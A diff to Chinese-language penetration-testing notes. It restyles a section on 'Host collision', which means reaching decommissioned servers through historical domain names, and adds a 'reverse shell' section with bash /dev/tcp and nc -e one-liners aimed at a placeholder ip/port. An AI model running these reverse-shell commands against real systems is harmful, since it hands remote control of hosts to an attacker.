@@ -134,6 +134,14 @@ localStorage与sessionStorage
 
 # 其他
 
-Host碰撞
+## Host碰撞
 
 若服务器配置了只能通过域名访问，“关闭”服务器时仅仅解除了域名解析，没有真正关掉服务器，我们收集到历史域名就能尝试通过此域名访问服务器。历史域名和IP往往不匹配，很可能要在大量候选IP中碰撞出真正的地址
+
+## 反弹Shell
+
+```bash
+bash -i >& /dev/tcp/ip/port 0>&1  # 简单方便。需要bash和dev权限
+nc -e /bin/bash ip port           # 需要目标安装了nc
+```
+
